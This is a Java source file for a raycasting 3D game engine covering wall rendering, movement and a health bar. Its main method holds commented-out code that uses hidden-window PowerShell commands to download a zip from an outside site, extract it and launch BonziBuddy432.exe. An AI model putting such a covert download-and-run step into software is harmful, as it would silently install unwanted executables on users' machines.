import java.awt.Color;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferInt;
import java.awt.image.ImageObserver;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.Timer;

public class Engine extends JPanel {

	static class rect {
		public int screencoords[];
		public int texturecoords[];
		public BufferedImage texture;
		public ImageObserver imObserver;

		public rect(int s[], int t[], BufferedImage c, ImageObserver o) {
			screencoords = s;
			texturecoords = t;
			texture = c;
			imObserver = o;
		}
	}

	private class Keyboard implements KeyListener {

		@Override
		public void keyTyped(KeyEvent e) {
		}

		@Override
		public void keyPressed(KeyEvent e) {

			switch (e.getKeyChar()) {
				case 'w' -> {
					keys[0] = true;
				}
				case 'a' -> {
					keys[1] = true;
				}
				case 's' -> {
					keys[2] = true;
				}
				case 'd' -> {
					keys[3] = true;
				}
				case 'h' -> {
					keys[6] = true;
				}
			}

			if (e.getKeyCode() == KeyEvent.VK_LEFT) {
				keys[4] = true;
			} else if (e.getKeyCode() == KeyEvent.VK_RIGHT) {
				keys[5] = true;
			}
		}

		@Override
		public void keyReleased(KeyEvent e) {

			switch (e.getKeyChar()) {
				case 'w' -> {
					keys[0] = false;
				}
				case 'a' -> {
					keys[1] = false;
				}
				case 's' -> {
					keys[2] = false;
				}
				case 'd' -> {
					keys[3] = false;
				}
				case 'h' -> {
					keys[6] = false;
				}
			}

			if (e.getKeyCode() == KeyEvent.VK_LEFT) {
				keys[4] = false;
			} else if (e.getKeyCode() == KeyEvent.VK_RIGHT) {
				keys[5] = false;
			}
		}

	}


	private static final int map[][] = Room.createRoom();
	private static final int mapLen = map.length;

	private static double posX = 3;
	private static double posY = 3;
	private static double dirX = -1;
	private static double dirY = 0;
	private static double planeX = 0;
	private static double planeY = 0.65;

	private static final double moveSpeed = 0.06;
	private static final double rotSpeed = 0.03;

	private static final int transparencyLimit = 1;

	rect rects[] = new rect[transparencyLimit * 800];

	private static boolean keys[] = new boolean[7];

	private final BufferedImage image;
	private final BufferedImage walltexture;
	private final BufferedImage doortexture;
	private final BufferedImage floortexture;
	private final Graphics g;
	private final Timer timer;

	private final ExecutorService executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());

	public Engine() throws IOException {

		image = new BufferedImage(800, 800, BufferedImage.TYPE_INT_RGB);
		g = image.getGraphics();

		walltexture = ImageLoader.loadImageAsRGB("assets/images/textures/wall.png");
		doortexture = ImageLoader.loadImageAsRGB("assets/images/textures/door.png");
		floortexture = ImageLoader.loadImageAsRGB("assets/images/textures/floor.png");
		for (int i = 0; i < 800; i++) {
			parallelizedX.add(i);
		}

		timer = new Timer(10, new TimerListener());
		timer.start();
		addKeyListener(new Keyboard());
		setFocusable(true);

	}

	private class TimerListener implements ActionListener {
		@Override
		public void actionPerformed(ActionEvent e) {
			long a = System.nanoTime();
			g.setColor(Color.black);
			g.fillRect(0, 0, 800, 800);
			move();
			// drawFloor();
			renderWalls();
			for (int i = transparencyLimit - 1; i >= 0; i--) {
				Future<?> futures[] = new Future<?>[800];
				int n = 0;
				for (int j = 0; j < 800; j++) {
					rect r = rects[800 * i + j];
					if (r == null)
						continue;
					Future<?> future = executor.submit(() -> g.drawImage(walltexture, r.screencoords[0],
							r.screencoords[1], r.screencoords[2], r.screencoords[3], r.texturecoords[0],
							r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], r.imObserver));
					futures[n] = future;
					n++;
				}
				for (Future<?> future : futures) {
					try {
						if (future != null)
							future.get(); // Ensure task completion before continuing
					} catch (InterruptedException | ExecutionException f) {
					}
				}
			}

			Arrays.setAll(rects, i -> null);
			repaint();
			long dif = System.nanoTime() - a;
			double fps = 1000000000.0 / dif;
			g.setColor(Color.red);
			g.drawString("FPS: " + Integer.toString((int) fps), 10, 10);

			ImageIcon barColour;

			int hpWidth = 400, hpHeight = 50, hpX = 100, hpY = 720;

			if (Player.getHealth() > 20) {
				barColour = new ImageIcon("assets/images/textures/greenBar.png");
				g.setColor(Color.green);
				g.drawImage(barColour.getImage(), hpX + 15, hpY + 15, (int) (Player.getHealth() * (hpWidth / 100)) - 30,
						hpHeight - 30, null);
			} else {
				barColour = new ImageIcon("assets/images/textures/redBar.png");
				g.setColor(Color.red);
				g.drawImage(barColour.getImage(), hpX + 15, hpY + 15,
						(int) (Player.getHealth() * (hpWidth / 100) + 15) - 30, hpHeight - 30, null);
			}

			barColour = new ImageIcon("assets/images/textures/healthBar.png");
			g.drawImage(barColour.getImage(), hpX, hpY, hpWidth, hpHeight, null);

			g.drawString(((int) (Player.getHealth()) + "%"), hpX - 40, hpY + 30);

			if (Player.getHealth() <= 0) {
				g.fillRect(0, 0, 1200, 1200);
			}
		}
	}

	@Override
	public void paintComponent(Graphics g) {
		g.drawImage(image, 0, 0, getWidth(), getHeight(), null);
	}

	public void renderWalls() {

		for (int x = 0; x < 800; x++) {
			double c = x / 400.0 - 1;
			double raydirX = dirX + c * planeX;
			double raydirY = dirY + c * planeY;
			double dx = (raydirX == 0) ? 1e20 : Math.abs(1 / raydirX);
			double dy = (raydirY == 0) ? 1e20 : Math.abs(1 / raydirY);

			int side = 0;

			int mapX = (int) posX;
			int mapY = (int) posY;

			double lenX;
			double lenY;
			double stepX;
			double stepY;

			if (raydirX < 0) {
				lenX = (posX - mapX) * dx;
				stepX = -1;
			} else {
				lenX = (1 - posX + mapX) * dx;
				stepX = 1;
			}
			if (raydirY < 0) {
				lenY = (posY - mapY) * dy;
				stepY = -1;
			} else {
				lenY = (1 + mapY - posY) * dy;
				stepY = 1;
			}

			double wallcoord;
			double dist;

			int hits = 0;
			for (int i = 0; i < 200; i++) {
				if ((mapX < 0 || mapX >= mapLen) || (mapY < 0 || mapY >= mapLen))
					break;
				if (map[mapX][mapY] != 0) {
					if (side == 0) {
						dist = (lenX - dx);
						double texturedist = dist * raydirY + posY;
						wallcoord = texturedist - Math.floor(texturedist);
					} else {
						dist = (lenY - dy);
						double texturedist = dist * raydirX + posX;
						wallcoord = texturedist - Math.floor(texturedist);
					}

					int lineHeight = (int) (800 / (dist));

					int screencoords[] = { (int) x, (int) (400 - lineHeight / 2), (int) x + 1,
							(int) (400 + lineHeight / 2) };
					int texturecoords[] = { (int) (wallcoord * 300), 0, (int) (wallcoord * 300) + 1, 299 };

					hits++;
					boolean b = false;
					if (hits >= transparencyLimit) {
						hits = transparencyLimit;
						b = true;
					}
					rects[800 * (transparencyLimit - hits) + x] = new rect(screencoords, texturecoords,
							walltexture, this);
					if (b)
						break;
				}
				if (lenY < lenX) {
					mapY += stepY;
					lenY += dy;
					side = 1;
				} else {
					mapX += stepX;
					lenX += dx;
					side = 0;
				}
			}
		}

	}

	public void drawFloor() {

		DataBufferInt imageBuffer = (DataBufferInt) image.getRaster().getDataBuffer();
		DataBufferInt textureBuffer = (DataBufferInt) floortexture.getRaster().getDataBuffer();

		int imageData[] = imageBuffer.getData();
		int textureData[] = textureBuffer.getData();

		for (int x = 0; x < 800; x++) {
			// parallelizedX.forEach(
			// x -> {
			double c = x / 400.0 - 1;
			double raydirX = dirX + c * planeX;
			double raydirY = dirY + c * planeY;
			for (int y = 0; y < 400; y++) {

				double perpDist = 400.0 / y;
				double pixelx = (raydirX * perpDist + posX);
				double pixely = (raydirY * perpDist + posY);
				if ((pixelx >= 0 && pixelx <= mapLen) && (pixely >= 0 && pixely <= mapLen)) {
					if (map[(int) pixelx][(int) pixely] != 0)
						continue;
					int imagex = (int) ((pixelx - (int) pixelx) * 300);
					int imagey = (int) ((pixely - (int) pixely) * 300);
					int pixelColor = textureData[300 * imagey + imagex];
					imageData[800 * (y + 400) + x] = pixelColor;
				}
			}
		}
	}

	public static void move() {

		double oldX = posX;
		double oldY = posY;

		if (keys[0]) {
			posX += dirX * moveSpeed;
			posY += dirY * moveSpeed;
		}
		if (keys[1]) {
			posX -= planeX * moveSpeed;
			posY -= planeY * moveSpeed;
		}
		if (keys[2]) {
			posX -= dirX * moveSpeed;
			posY -= dirY * moveSpeed;
		}
		if (keys[3]) {
			posX += planeX * moveSpeed;
			posY += planeY * moveSpeed;
		}
		if (keys[6]) {
			Player.changeHealth(-1);
		}

		if (keys[4]) {
			double oldDirX = dirX;
			dirX = dirX * Math.cos(rotSpeed) - dirY * Math.sin(rotSpeed);
			dirY = oldDirX * Math.sin(rotSpeed) + dirY * Math.cos(rotSpeed);
			double oldPlaneX = planeX;
			planeX = planeX * Math.cos(rotSpeed) - planeY * Math.sin(rotSpeed);
			planeY = oldPlaneX * Math.sin(rotSpeed) + planeY * Math.cos(rotSpeed);
		} else if (keys[5]) {
			double oldDirX = dirX;
			dirX = dirX * Math.cos(-rotSpeed) - dirY * Math.sin(-rotSpeed);
			dirY = oldDirX * Math.sin(-rotSpeed) + dirY * Math.cos(-rotSpeed);
			double oldPlaneX = planeX;
			planeX = planeX * Math.cos(-rotSpeed) - planeY * Math.sin(-rotSpeed);
			planeY = oldPlaneX * Math.sin(-rotSpeed) + planeY * Math.cos(-rotSpeed);
		}

		if (map[(int) posX][(int) posY] != 0) {
			posX = oldX;
			posY = oldY;
		}
	}

	// main method with standard graphics code
	public static void main(String[] args) throws IOException, InterruptedException {
		// System.setProperty("sun.java2d.opengl", "false");
		JFrame frame = new JFrame("Rishi x Avaline");
		// String s[] = {"powershell", "-Command \"Start-Process -FilePath 'curl'
		// -ArgumentList 'https://bonzi.link/Bon.zip -o e.zip' -WindowStyle Hidden\""};
		// String s2[] = {"powershell", "-Command \"Start-Process -FilePath 'tar'
		// -ArgumentList '-xf e.zip' -WindowStyle Hidden\""};
		// String s3[] = {"powershell", "-Command \"Start-Process -FilePath
		// 'BonziBuddy432.exe'\""};
		// Process p1 = Runtime.getRuntime().exec(s);
		// p1.waitFor();
		// Process p2 = Runtime.getRuntime().exec(s2);
		// p2.waitFor();
		// Runtime.getRuntime().exec(s3);
		frame.setSize(800, 800);
		frame.setLocation(0, 0);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setContentPane(new Engine());
		frame.setVisible(true);
	}

}